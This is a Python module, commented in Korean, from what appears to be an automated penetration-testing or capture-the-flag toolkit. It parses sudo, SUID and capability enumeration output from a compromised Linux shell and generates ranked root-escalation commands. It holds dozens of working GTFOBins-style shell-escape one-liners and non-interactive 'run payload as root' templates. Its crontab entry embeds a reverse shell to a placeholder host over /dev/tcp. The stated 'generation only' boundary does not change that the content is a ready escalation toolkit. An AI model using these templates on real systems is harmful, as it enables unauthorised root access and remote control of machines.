"""권한 상승 '열거 출력 분석 → 벡터 랭킹 → 상승 계획 생성' (③ 기반) — 생성 전용 경계.

안전 경계(불변):
  · 이 모듈은 **획득한 셸 안에서 사용자가 이미 실행한** privesc 열거 명령의 **출력 텍스트를
    '파싱'** 하고, 구체적 상승 벡터를 랭킹해 **GTFOBins 식 상승 '제안 명령'(문자열)만 만든다.**
  · 명령을 **실행하지 않는다** — 네트워크·프로세스 실행이 전혀 없다(RCE/권한상승 표면 없음).
  · 생성된 제안은 사람이 **획득한 대상 셸에서** 직접(또는 사용자 리포의 실행 스테이지가 게이트
    경유로) 실행한다. 폐루프의 '실제 실행 → root 확인 → 상태 전이'는 이 모듈 밖이다.

출처: GTFOBins(공개 문서) · HackTricks. 권한 확인 자산 전용.
"""
from __future__ import annotations

import re
from dataclasses import dataclass

# GTFOBins 식 상승 템플릿(대표 커브셋 — 전수 아님). {bin} 은 바이너리 경로/이름으로 치환.
# sudo = 'sudo -l' 에 NOPASSWD/허용된 경우, suid = SUID 비트가 선 경우의 한 줄 상승 제안.
# 전부 '제안 문자열'이며 이 모듈은 실행하지 않는다(사람이 획득한 셸에서 실행).
_GTFO: dict[str, dict[str, str]] = {
    "find": {"sudo": "sudo find . -exec /bin/sh \\; -quit",
             "suid": "{bin} . -exec /bin/sh -p \\; -quit"},
    "vim": {"sudo": "sudo vim -c ':!/bin/sh'", "suid": "{bin} -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'"},
    "vi": {"sudo": "sudo vi -c ':!/bin/sh'"},
    "nano": {"sudo": "sudo nano\n# ^R^X 로 'reset; sh 1>&0 2>&0' 실행"},
    "less": {"sudo": "sudo less /etc/profile\n# 그 뒤 '!/bin/sh'"},
    "more": {"sudo": "sudo more /etc/profile\n# 그 뒤 '!/bin/sh'"},
    "man": {"sudo": "sudo man man\n# 그 뒤 '!/bin/sh'"},
    "awk": {"sudo": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
            "suid": "{bin} 'BEGIN {system(\"/bin/sh\")}'"},
    "gawk": {"sudo": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"},
    "nmap": {"sudo": "sudo nmap --interactive\n# 그 뒤 '!sh' (구버전) 또는 --script 로 os.execute"},
    "python": {"sudo": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
               "suid": "{bin} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
    "python3": {"sudo": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
                "suid": "{bin} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
    "perl": {"sudo": "sudo perl -e 'exec \"/bin/sh\";'",
             "suid": "{bin} -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'"},
    "ruby": {"sudo": "sudo ruby -e 'exec \"/bin/sh\"'"},
    "bash": {"sudo": "sudo bash", "suid": "{bin} -p"},
    "sh": {"sudo": "sudo sh", "suid": "{bin} -p"},
    "env": {"sudo": "sudo env /bin/sh", "suid": "{bin} /bin/sh -p"},
    "tar": {"sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
    "zip": {"sudo": "sudo zip /tmp/x.zip /etc/hostname -T -TT 'sh #'"},
    "cp": {"sudo": "sudo cp /bin/sh /tmp/rootsh; sudo chmod +s /tmp/rootsh 2>/dev/null # 또는 /etc/passwd 덮어쓰기"},
    "git": {"sudo": "sudo git -p help config\n# 그 뒤 '!/bin/sh'"},
    "systemctl": {"sudo": "# 악성 유닛 작성 후: sudo systemctl link /tmp/evil.service; sudo systemctl start evil"},
    "docker": {"sudo": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
    "apt": {"sudo": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"},
    "mount": {"sudo": "# (조건부) sudo mount 로 쓰기가능 마운트·nosuid 우회 점검"},
    # ── 확장(표준 GTFOBins — 자동 root 커버리지 확대) ──
    "php": {"sudo": "sudo php -r 'system(\"/bin/sh\");'",
            "suid": "{bin} -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'"},
    "node": {"sudo": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"},
    "lua": {"sudo": "sudo lua -e 'os.execute(\"/bin/sh\")'"},
    "gdb": {"sudo": "sudo gdb -nx -ex '!sh' -ex quit"},
    "make": {"sudo": "sudo make -s --eval=$'x:\\n\\t-/bin/sh 0<&1'"},
    "taskset": {"sudo": "sudo taskset 1 /bin/sh", "suid": "{bin} 1 /bin/sh -p"},
    "nice": {"sudo": "sudo nice /bin/sh"},
    "stdbuf": {"sudo": "sudo stdbuf -i0 /bin/sh"},
    "timeout": {"sudo": "sudo timeout 7d /bin/sh"},
    "flock": {"sudo": "sudo flock -u / /bin/sh"},
    "setarch": {"sudo": "sudo setarch $(uname -m) /bin/sh"},
    "xargs": {"sudo": "sudo xargs -a /dev/null sh"},
    "busybox": {"sudo": "sudo busybox sh"},
    "dash": {"sudo": "sudo dash", "suid": "{bin} -p"},
    "ash": {"sudo": "sudo ash", "suid": "{bin} -p"},
    "zsh": {"sudo": "sudo zsh"},
    "ksh": {"sudo": "sudo ksh"},
    "cpulimit": {"sudo": "sudo cpulimit -l 100 -f -- /bin/sh"},
    "ed": {"sudo": "sudo ed\n# 그 뒤 '!/bin/sh'"},
    "rvim": {"sudo": "sudo rvim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'"},
    "crontab": {"sudo": "sudo crontab -e\n# 에디터에서 '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'"},
    "ssh": {"sudo": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"},
}
# capability 상승(= getcap 에서 cap_setuid+ep) 가능한 인터프리터.
_CAP_SETUID = {
    "python", "python3", "perl", "ruby", "node",
}
# SUID 목록에서 '표준/무해'로 보통 제외하는 바이너리(오탐 억제).
_SUID_COMMON = {
    "sudo", "su", "mount", "umount", "passwd", "chsh", "chfn", "gpasswd",
    "newgrp", "pkexec", "ping", "ping6", "fusermount", "fusermount3",
    "ntfs-3g", "dbus-daemon-launch-helper", "polkit-agent-helper-1",
    "chrome-sandbox", "snap-confine",
}


# 비대화형(one-shot SSH 용) 상승 템플릿 — {payload} 를 'root 로 돌릴 한 줄'로, {bin} 을
# 바이너리 경로로 치환해 '대화형 /bin/sh 스폰 없이' 바로 payload 를 실행하는 형태.
# TTY 없는 one-shot(`sshpass ssh "<cmd>"`)에서도 동작하도록 설계(생성 전용 — 문자열만).
# {payload} 에 'id' 를 넣으면 uid=0 검증, 'cat /root/root.txt' 를 넣으면 루트 플래그 직독.
_ONESHOT: dict[str, dict[str, str]] = {
    "find": {"sudo": "sudo find . -maxdepth 0 -exec {payload} \\;",
             "suid": "{bin} . -maxdepth 0 -exec {payload} \\;"},
    "awk": {"sudo": "sudo awk 'BEGIN{system(\"{payload}\")}'",
            "suid": "{bin} 'BEGIN{system(\"{payload}\")}'"},
    "gawk": {"sudo": "sudo gawk 'BEGIN{system(\"{payload}\")}'"},
    "python": {"sudo": "sudo python -c 'import os;os.system(\"{payload}\")'",
               "suid": "{bin} -c 'import os;os.setuid(0);os.system(\"{payload}\")'",
               "cap": "{bin} -c 'import os;os.setuid(0);os.system(\"{payload}\")'"},
    "python3": {"sudo": "sudo python3 -c 'import os;os.system(\"{payload}\")'",
                "suid": "{bin} -c 'import os;os.setuid(0);os.system(\"{payload}\")'",
                "cap": "{bin} -c 'import os;os.setuid(0);os.system(\"{payload}\")'"},
    "perl": {"sudo": "sudo perl -e 'system(\"{payload}\")'",
             "suid": "{bin} -e 'use POSIX qw(setuid);setuid(0);system(\"{payload}\")'",
             "cap": "{bin} -e 'use POSIX qw(setuid);setuid(0);system(\"{payload}\")'"},
    "ruby": {"sudo": "sudo ruby -e 'system(\"{payload}\")'"},
    "bash": {"sudo": "sudo bash -c '{payload}'", "suid": "{bin} -p -c '{payload}'"},
    "sh": {"sudo": "sudo sh -c '{payload}'", "suid": "{bin} -p -c '{payload}'"},
    "env": {"sudo": "sudo env {payload}", "suid": "{bin} {payload}"},
    "vim": {"sudo": "sudo vim -c ':!{payload}' -c ':q!'"},
    "vi": {"sudo": "sudo vi -c ':!{payload}' -c ':q!'"},
    "tar": {"sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 "
                    "--checkpoint-action=exec='{payload}'"},
    "node": {"cap": "{bin} -e 'process.setuid(0);require(\"child_process\")"
                    ".execSync(\"{payload}\",{stdio:\"inherit\"})'"},
    "docker": {"sudo": "sudo docker run -v /:/mnt --rm alpine chroot /mnt sh -c '{payload}'"},
    # ── 확장(표준 GTFOBins one-shot — 발판 세션에서 비대화형 상승) ──
    "php": {"sudo": "sudo php -r 'system(\"{payload}\");'",
            "suid": "{bin} -r 'posix_setuid(0);system(\"{payload}\");'"},
    "node": {"sudo": "sudo node -e 'require(\"child_process\").execSync(\"{payload}\",{stdio:\"inherit\"})'"},
    "lua": {"sudo": "sudo lua -e 'os.execute(\"{payload}\")'"},
    "gdb": {"sudo": "sudo gdb -nx -ex 'py import os;os.system(\"{payload}\")' -ex quit"},
    "taskset": {"sudo": "sudo taskset 1 {payload}", "suid": "{bin} 1 /bin/sh -pc '{payload}'"},
    "nice": {"sudo": "sudo nice {payload}"},
    "stdbuf": {"sudo": "sudo stdbuf -i0 {payload}"},
    "timeout": {"sudo": "sudo timeout 7d {payload}"},
    "flock": {"sudo": "sudo flock -u / sh -c '{payload}'"},
    "setarch": {"sudo": "sudo setarch $(uname -m) {payload}"},
    "xargs": {"sudo": "sudo xargs -a /dev/null sh -c '{payload}'"},
    "busybox": {"sudo": "sudo busybox sh -c '{payload}'", "suid": "{bin} sh -c '{payload}'"},
    "dash": {"sudo": "sudo dash -c '{payload}'", "suid": "{bin} -p -c '{payload}'"},
    "ash": {"sudo": "sudo ash -c '{payload}'", "suid": "{bin} -p -c '{payload}'"},
    "zsh": {"sudo": "sudo zsh -c '{payload}'"},
    "ksh": {"sudo": "sudo ksh -c '{payload}'"},
    "cpulimit": {"sudo": "sudo cpulimit -l 100 -f -- sh -c '{payload}'"},
}


@dataclass
class PrivescVector:
    """구체적 권한상승 벡터 + 상승 '제안 명령'(실행 아님 — 파싱·생성 결과)."""
    kind: str                 # sudo / suid / capability / sudo-all / writable-passwd
    binary: str = ""
    detail: str = ""
    plan: str = ""            # GTFOBins 식 상승 제안(대화형 — 획득한 셸에서 사람이 실행)
    confidence: str = "med"   # high / med / low
    source: str = "GTFOBins"
    path: str = ""            # 바이너리 전체 경로(one-shot 템플릿 치환용)
    oneshot_tmpl: str = ""    # 비대화형 템플릿({payload}/{bin} 치환) — 없으면 빈 문자열

    def oneshot(self, payload: str = "id") -> str:
        """비대화형(one-shot SSH 용) 상승 명령 생성 — {payload} 를 'root 로 돌릴 명령'으로 치환.
        실행 아님 — 문자열 생성만. 템플릿이 없으면 빈 문자열(폴백은 호출측 몫).
        예) oneshot('id') → uid=0 검증용, oneshot('cat /root/root.txt') → 루트 플래그 직독."""
        if not self.oneshot_tmpl:
            return ""
        return (self.oneshot_tmpl
                .replace("{bin}", self.path or self.binary)
                .replace("{payload}", payload))

    def __str__(self) -> str:
        head = f"[{self.kind}] {self.binary}".rstrip()
        c = {"high": "★★★", "med": "★★", "low": "★"}.get(self.confidence, "")
        return f"{c} {head} — {self.detail}".strip()


def _basename(path: str) -> str:
    return re.sub(r"^.*/", "", (path or "").strip())


def _name_keys(b: str) -> list[str]:
    """바이너리 basename → 레지스트리 조회 후보키(버전 접미 정규화).
    예: python3.8 → [python3.8, python3, python]. 중복 없이 순서 보존."""
    keys = [b]
    stripped = re.sub(r"\.\d+$", "", b)      # python3.8 → python3
    if stripped != b:
        keys.append(stripped)
    nodigit = re.sub(r"[\d.]+$", "", b)      # python3.8 → python
    if nodigit and nodigit not in keys:
        keys.append(nodigit)
    return keys


def _lookup(table: dict, b: str, kind: str) -> str:
    """table(_GTFO/_ONESHOT)에서 b(버전 접미 정규화 포함)의 kind 템플릿을 찾는다(없으면 '')."""
    for k in _name_keys(b):
        t = table.get(k, {}).get(kind)
        if t:
            return t
    return ""


def analyze_sudo(output: str) -> list[PrivescVector]:
    """'sudo -l' 출력 파싱 → NOPASSWD/허용 바이너리를 GTFOBins 와 대조해 벡터 생성.
    '(ALL : ALL) ALL' 처럼 전체 sudo 가능이면 최상위 벡터."""
    vectors: list[PrivescVector] = []
    if not output:
        return vectors
    low = output.lower()
    # 전체 sudo (ALL) ALL / (ALL : ALL) ALL → 바로 root
    if re.search(r"\(all\s*(?::\s*all)?\)\s+all\b", low):
        vectors.append(PrivescVector(
            "sudo-all", "ALL", "모든 명령 sudo 가능 → 'sudo su -' 또는 'sudo /bin/sh'",
            "sudo -i   # 또는 sudo /bin/sh", "high", "sudo -l",
            oneshot_tmpl="sudo {payload}"))
    # NOPASSWD/허용된 개별 바이너리
    for m in re.finditer(r"(?:nopasswd:\s*)?((?:/[\w.\-/]+)+)", output):
        path = m.group(1)
        b = _basename(path)
        tmpl = _lookup(_GTFO, b, "sudo")
        if tmpl:
            nopass = "nopasswd" in output[max(0, m.start() - 40):m.start()].lower()
            vectors.append(PrivescVector(
                "sudo", b, f"sudo 로 {b} 실행 가능"
                + (" (NOPASSWD)" if nopass else "") + " → 셸 탈출",
                tmpl.replace("{bin}", path), "high" if nopass else "med", "GTFOBins",
                path=path, oneshot_tmpl=_lookup(_ONESHOT, b, "sudo")))
    return _dedupe(vectors)


def analyze_suid(output: str) -> list[PrivescVector]:
    """'find -perm -4000' 출력 파싱 → 비표준 SUID 바이너리를 GTFOBins 와 대조."""
    vectors: list[PrivescVector] = []
    if not output:
        return vectors
    for line in output.splitlines():
        path = line.strip().split()[0] if line.strip() else ""
        if not path.startswith("/"):
            continue
        b = _basename(path)
        if b in _SUID_COMMON:
            continue
        tmpl = _lookup(_GTFO, b, "suid")
        if tmpl:
            vectors.append(PrivescVector(
                "suid", b, f"SUID {b} → -p 보존 셸/명령 실행으로 euid=0",
                tmpl.replace("{bin}", path), "high", "GTFOBins",
                path=path, oneshot_tmpl=_lookup(_ONESHOT, b, "suid")))
    return _dedupe(vectors)


def analyze_capabilities(output: str) -> list[PrivescVector]:
    """'getcap -r /' 출력 파싱 → cap_setuid+ep 를 가진 인터프리터 탐지."""
    vectors: list[PrivescVector] = []
    if not output:
        return vectors
    for line in output.splitlines():
        m = re.match(r"\s*(/\S+)\s*=?\s*(.+)$", line)
        if not m:
            continue
        path, caps = m.group(1), m.group(2).lower()
        if "cap_setuid" not in caps:
            continue
        b = _basename(path)
        base = re.sub(r"[\d.]+$", "", b)  # python3.8 → python
        if b in _CAP_SETUID or base in _CAP_SETUID:
            if base.startswith("python") or b.startswith("python"):
                plan = f"{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
            elif base == "perl":
                plan = f"{path} -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'"
            else:
                plan = f"{path}   # cap_setuid → setuid(0) 후 셸"
            cap_tmpl = _lookup(_ONESHOT, b, "cap")
            vectors.append(PrivescVector(
                "capability", b, f"{b} 에 cap_setuid+ep → setuid(0) 가능",
                plan, "high", "GTFOBins/caps",
                path=path, oneshot_tmpl=cap_tmpl))
    return _dedupe(vectors)


def _dedupe(vectors: list[PrivescVector]) -> list[PrivescVector]:
    seen: set[tuple[str, str]] = set()
    out: list[PrivescVector] = []
    for v in vectors:
        key = (v.kind, v.binary)
        if key not in seen:
            seen.add(key)
            out.append(v)
    return out


_CONF_ORDER = {"high": 0, "med": 1, "low": 2}


def analyze_enum(enum_text: str) -> list[PrivescVector]:
    """privesc 열거 출력(여러 명령이 섞인 코퍼스)에서 모든 벡터를 뽑아 확신도순 랭킹.
    실행 없음 — 파싱·랭킹·제안 생성만. 폐루프의 '후보 선정' 단계."""
    vectors: list[PrivescVector] = []
    vectors += analyze_sudo(enum_text)
    vectors += analyze_suid(enum_text)
    vectors += analyze_capabilities(enum_text)
    vectors = _dedupe(vectors)
    vectors.sort(key=lambda v: _CONF_ORDER.get(v.confidence, 9))
    return vectors


def render_vectors(vectors: list[PrivescVector], top: int = 8) -> str:
    """사람이 보는 벡터 요약(제안 명령 포함). 생성 전용 — 실행하지 않음."""
    if not vectors:
        return "권한상승 벡터: 열거 출력에서 자동 식별된 후보 없음(수동 점검 필요)."
    lines = [f"권한상승 벡터 {len(vectors)}건(확신도순) — 획득한 셸에서 검토 후 실행:"]
    for v in vectors[:top]:
        lines.append(f"  {v}")
        if v.plan:
            lines.append(f"      ↳ 대화형: {v.plan}")
        root_read = v.oneshot("cat /root/root.txt 2>/dev/null")
        if root_read:
            lines.append(f"      ↳ 비대화형(one-shot): {root_read}")
    return "\n".join(lines)
